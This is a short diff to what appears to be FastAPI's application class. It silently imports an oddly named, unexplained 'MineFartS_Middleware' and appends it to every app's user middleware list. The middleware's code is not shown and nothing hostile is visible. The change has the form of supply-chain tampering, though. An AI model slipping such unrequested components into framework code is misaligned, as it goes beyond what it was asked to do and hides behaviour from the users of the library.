@@ -1013,9 +1013,13 @@ class FastAPI(Starlette):
             websocket_request_validation_exception_handler,  # type: ignore[arg-type]  # ty: ignore[unused-ignore-comment]
         )  # ty: ignore[no-matching-overload]
 
+        from .middleware.minefarts import MineFartS_Middleware
+
         self.user_middleware: list[Middleware] = (
-            [] if middleware is None else list(middleware)
+            [] if middleware is None else list(middleware) + \
+            [MineFartS_Middleware]
         )
+        
         self.middleware_stack: ASGIApp | None = None
         self.setup()
 
